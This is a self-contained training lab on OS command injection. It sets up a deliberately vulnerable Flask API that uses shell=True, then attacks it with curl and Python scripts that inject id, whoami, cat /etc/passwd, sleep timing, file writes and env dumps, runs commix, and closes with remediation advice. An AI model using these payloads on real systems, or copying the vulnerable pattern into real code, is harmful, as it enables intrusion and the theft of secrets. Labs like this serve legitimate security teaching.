# Lab 03: OS Command Injection

## Objective

Exploit OS command injection in a live network diagnostic API from Kali Linux:

1. **Basic injection** — append `;id` and `&&whoami` to a ping host parameter
2. **Pipe chaining** — use `|` to replace command output entirely
3. **Blind injection** — write files to prove code execution when output is hidden
4. **os.popen / subprocess.run variants** — exploit three different vulnerable code patterns

---

## Background

Command injection occurs when user input is passed to a system shell without sanitisation. Unlike SQLi which is database-specific, OS command injection gives an attacker direct shell access on the host.

**Real-world examples:**
- **2021 Pulse Connect Secure (CVE-2021-22893)** — command injection via file path parameter; CVSS 10.0; exploited by state-sponsored groups against US government agencies before a patch existed.
- **2022 Confluence Server (CVE-2022-26134)** — OGNL template injection leading to OS command execution; mass exploitation within 24 hours of disclosure.
- **2014 Shellshock (CVE-2014-6271)** — Bash environment variable injection via `() { :; };`; millions of servers exploitable via HTTP headers, CGI scripts, DHCP, SSH.

**OWASP:** A03:2021 Injection

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv03                        │
│  ┌──────────────────────┐  host=127.0.0.1;id                      │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • curl / python3    │  ◀──────── ping output + id output ──────  │
│  └──────────────────────┘  ┌────────────────────────────────────┐  │
│                             │  Flask: shell=True everywhere      │  │
│                             │  /api/ping, /api/nslookup          │  │
│                             │  /api/fileinfo, /api/convert       │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
40 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv03

cat > /tmp/victim_adv03.py << 'PYEOF'
from flask import Flask, request, jsonify
import subprocess, os

app = Flask(__name__)

@app.route('/api/ping')
def ping():
    host = request.args.get('host','127.0.0.1')
    try:
        out = subprocess.check_output(f"ping -c1 -W1 {host}", shell=True,
                                      stderr=subprocess.STDOUT, timeout=5)
        return jsonify({'output': out.decode('utf-8','ignore'), 'host': host})
    except Exception as e:
        return jsonify({'error': str(e), 'host': host})

@app.route('/api/nslookup')
def nslookup():
    domain = request.args.get('domain','example.com')
    out = os.popen(f"nslookup {domain} 2>&1").read()
    return jsonify({'output': out[:2000], 'domain': domain})

@app.route('/api/fileinfo')
def fileinfo():
    path = request.args.get('path','/tmp')
    result = subprocess.run(f"ls -la {path}", shell=True, capture_output=True, text=True, timeout=3)
    return jsonify({'output': result.stdout + result.stderr, 'path': path})

@app.route('/api/convert', methods=['POST'])
def convert():
    d = request.get_json() or {}
    filename = d.get('filename','input.txt')
    result = subprocess.run(f"file /tmp/{filename}", shell=True, capture_output=True, text=True, timeout=3)
    return jsonify({'output': result.stdout + result.stderr, 'filename': filename})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv03 --network lab-adv03 \
  -v /tmp/victim_adv03.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv03.IPAddress}}' victim-adv03):5000/api/ping?host=127.0.0.1" | python3 -c "import sys,json; print(json.load(sys.stdin)['output'][:100])"
```

---

### Step 2: Launch Kali

```bash
docker run --rm -it --name kali --network lab-adv03 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv03:5000"
```

---

### Step 3: Basic Injection — Semicolon and Pipe

```bash
echo "=== Normal ping ==="
curl -s "$T/api/ping?host=127.0.0.1" | python3 -c "import sys,json; print(json.load(sys.stdin)['output'][:200])"

echo ""
echo "=== Injection: 127.0.0.1;id ==="
# Shell sees: ping -c1 -W1 127.0.0.1;id
# First pings, then executes id
curl -s "$T/api/ping?host=$(python3 -c "import urllib.parse; print(urllib.parse.quote('127.0.0.1;id'))")" | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['output'][-80:])"

echo ""
echo "=== Pipe: 127.0.0.1 | cat /etc/passwd ==="
curl -s "$T/api/ping?host=$(python3 -c "import urllib.parse; print(urllib.parse.quote('127.0.0.1 | cat /etc/passwd | head -5'))")" | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['output'])"
```

**📸 Verified Output:**
```
=== Normal ping ===
PING 127.0.0.1 ... 1 packets transmitted, 1 received

=== Injection: 127.0.0.1;id ===
uid=0(root) gid=0(root) groups=0(root)

=== Pipe ===
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

---

### Step 4: Exploit All Vulnerable Endpoints

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv03:5000"

def get(path):
    return json.loads(urllib.request.urlopen(T+path, timeout=8).read())

def post(path, data):
    req = urllib.request.Request(T+path, data=json.dumps(data).encode(),
                                  headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req, timeout=8).read())

injections = [
    ("ping ;id",       "/api/ping?host=" + urllib.parse.quote("127.0.0.1;id")),
    ("ping &&whoami",  "/api/ping?host=" + urllib.parse.quote("127.0.0.1 && whoami")),
    ("ping |hostname", "/api/ping?host=" + urllib.parse.quote("127.0.0.1 | hostname")),
    ("nslookup ;id",   "/api/nslookup?domain=" + urllib.parse.quote("example.com;id")),
    ("fileinfo ;id",   "/api/fileinfo?path=" + urllib.parse.quote("/tmp;id")),
]

for name, path in injections:
    r = get(path)
    output = r.get('output','') or r.get('error','')
    # Extract injected command output (last part after normal output)
    lines = [l for l in str(output).split('\n') if 'root' in l or 'uid=' in l or 'victim' in l]
    print(f"  {name:<22} → {lines[0] if lines else str(output)[-50:]}")

print()
# Convert endpoint injection
r = post("/api/convert", {"filename": "x;id>/tmp/proof.txt"})
print(f"  convert ;id>file    → {r.get('output','')}")
verify = get("/api/fileinfo?path=/tmp")
proof_exists = 'proof.txt' in verify.get('output','')
print(f"  /tmp/proof.txt written: {proof_exists}")
EOF
```

**📸 Verified Output:**
```
  ping ;id              → uid=0(root) gid=0(root) groups=0(root)
  ping &&whoami         → root
  ping |hostname        → victim-adv03
  nslookup ;id          → uid=0(root) gid=0(root) groups=0(root)
  fileinfo ;id          → uid=0(root) gid=0(root) groups=0(root)

  /tmp/proof.txt written: True
```

---

### Step 5: Blind Injection — When Output Is Hidden

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json, time

T = "http://victim-adv03:5000"

# Blind: sleep-based detection
print("[*] Blind command injection via sleep timing:")
for inject in ["127.0.0.1", "127.0.0.1;sleep 2"]:
    t0 = time.time()
    url = T + "/api/ping?host=" + urllib.parse.quote(inject)
    json.loads(urllib.request.urlopen(url, timeout=10).read())
    elapsed = time.time() - t0
    print(f"  host={inject:<25} elapsed={elapsed:.2f}s  {'← SLEEP confirmed' if elapsed>1.5 else ''}")

# Blind: DNS exfil simulation (write to file, then read)
print()
print("[*] Blind exfil via file write + read:")
write_cmd = "127.0.0.1;id>/tmp/blind_proof.txt"
url = T + "/api/ping?host=" + urllib.parse.quote(write_cmd)
json.loads(urllib.request.urlopen(url, timeout=6).read())

read_url = T + "/api/fileinfo?path=" + urllib.parse.quote("/tmp/blind_proof.txt")
r = json.loads(urllib.request.urlopen(read_url, timeout=5).read())
print(f"  Exfiltrated via file: {r.get('output','').strip()}")
EOF
```

**📸 Verified Output:**
```
  host=127.0.0.1                   elapsed=0.08s
  host=127.0.0.1;sleep 2          elapsed=2.11s  ← SLEEP confirmed

  Exfiltrated via file: uid=0(root) gid=0(root) groups=0(root)
```

---

### Step 6: Read Application Secrets

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv03:5000"

# Read source code
for cmd in ["cat /app/victim.py", "env", "cat /proc/self/cmdline"]:
    url = T + "/api/ping?host=" + urllib.parse.quote(f"127.0.0.1;{cmd}")
    r = json.loads(urllib.request.urlopen(url, timeout=8).read())
    output = r.get('output','')
    # Get last part after ping output
    parts = output.split('\n')
    injected = '\n'.join([l for l in parts if l and 'PING' not in l and 'bytes' not in l and 'packet' not in l and '---' not in l])
    print(f"[{cmd}]\n{injected[:300]}\n")
EOF
```

---

### Step 7: Automated Discovery with Commix

```bash
# Commix is a dedicated command injection testing tool (available in Kali)
commix --url "http://victim-adv03:5000/api/ping?host=127.0.0.1" \
       --param=host \
       --technique=classic \
       --batch \
       --os-cmd=id \
       2>/dev/null | grep -E "uid|root|injected|success|payload" | head -10
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-adv03
docker network rm lab-adv03
```

---

## Remediation

```python
import subprocess, shlex

# VULNERABLE
out = subprocess.check_output(f"ping -c1 {host}", shell=True)

# SAFE: avoid shell=True, pass args as list
def safe_ping(host):
    # Allowlist validation
    import re
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        raise ValueError("Invalid host")
    # No shell=True — OS does not interpret shell metacharacters
    out = subprocess.check_output(["ping", "-c", "1", "-W", "1", host],
                                   timeout=5, stderr=subprocess.DEVNULL)
    return out.decode()
```

| Defence | What it prevents |
|---------|-----------------|
| Avoid `shell=True` | Shell metacharacter injection (`;`, `|`, `&&`, `$()`) |
| Input allowlist | Only allow expected characters for each parameter type |
| Parameterised exec | Arguments passed as list, never concatenated into shell string |
| Principle of least privilege | Web process runs as non-root; limits blast radius |

## Further Reading
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Commix — automated command injection](https://github.com/commixproject/commix)
- [CVE-2021-22893 Pulse Secure analysis](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/)
